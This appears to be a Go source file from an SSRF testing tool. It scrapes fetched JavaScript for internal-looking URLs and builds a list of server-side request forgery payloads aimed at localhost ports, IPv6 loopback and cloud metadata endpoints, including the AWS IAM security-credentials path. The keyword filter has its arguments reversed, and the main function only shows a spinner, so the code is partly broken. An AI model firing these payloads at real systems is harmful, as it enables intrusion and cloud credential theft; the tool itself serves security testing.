package generation

import (
        "bufio"
        "io/ioutil"
        "net/http"
        "os"
        "regexp"
        "strings"
        "time"

        "github.com/briandowns/spinner"
)

// Generate the wordlist from javascript
func generateWordlist() {

        s := spinner.New(spinner.CharSets[9], 100*time.Millisecond) // Build our new spinner
        s.Suffix = " Generating SSRF wordlist"
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)
        s.Stop()

        //payloads := searchForLinks()
        //fmt.Println(fmt.Sprintf(Cyan("SSRF Wordlist is %d lines"), Red(len(payloads))))
        //saveToFile(payloads, " Saving wordlist as ssrf.txt", "ssrf.txt")
}

// Search through all javascript for domains
func searchForLinks() []string {

        var links = make([]string, 0)
        var jsFiles = make([]string, 0)
        client := &http.Client{}

        scanner := bufio.NewScanner(os.Stdin)
        for scanner.Scan() {
                jsLink := scanner.Text()
                jsFiles = append(jsFiles, jsLink)

                req, err := http.NewRequest("GET", jsLink, nil)
                if err != nil {
                        return nil
                }

                resp, err := client.Do(req)
                if err != nil {
                        return nil
                }

                bodyBuffer, err := ioutil.ReadAll(resp.Body)
                if err != nil {
                        return nil
                }

                // The body to grep for
                bodyString := string(bodyBuffer)

                // Search for all links
                re := regexp.MustCompile(`(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]`)
                matches := re.FindStringSubmatch(bodyString)
                if matches != nil {

                        // Check for internal domains in js
                        if strings.Contains("internal", matches[0]) {
                                links = append(links, matches[0])
                        }
                        if strings.Contains("prod", matches[0]) {
                                links = append(links, matches[0])
                        }
                        if strings.Contains("jira", matches[0]) {
                                links = append(links, matches[0])
                        }
                        if strings.Contains("corp", matches[0]) {
                                links = append(links, matches[0])
                        }
                        if strings.Contains("uat", matches[0]) {
                                links = append(links, matches[0])
                        }
                }
        }

        // Append some other payloads
        links = append(links, "http://example.com")
        links = append(links, "http://127.0.0.1:80")
        links = append(links, "http://127.0.0.1:443")
        links = append(links, "http://127.0.0.1:22")
        links = append(links, "https://localhost/admin")
        links = append(links, "http://[::]:22/")
        links = append(links, "http://169.254.169.254")
        links = append(links, "http://169.254.169.254/computeMetadata/v1/")
        links = append(links, "169.254.169.254/latest/meta-data/iam/security-credentials/flaws/")
        links = append(links, "example.com")
        links = append(links, "127.0.0.1:80")
        links = append(links, "169.254.169.254/computeMetadata/v1/")
        links = append(links, "127.0.0.1:443")
        links = append(links, "127.0.0.1:22")
        links = append(links, "localhost/admin")
        links = append(links, "169.254.169.254")
        links = append(links, "[::]:22/")

        // Save the JS files.
        //data.saveToFile(jsFiles, " Saving JS Files for later use", "jsfiles.txt")

        return links
}
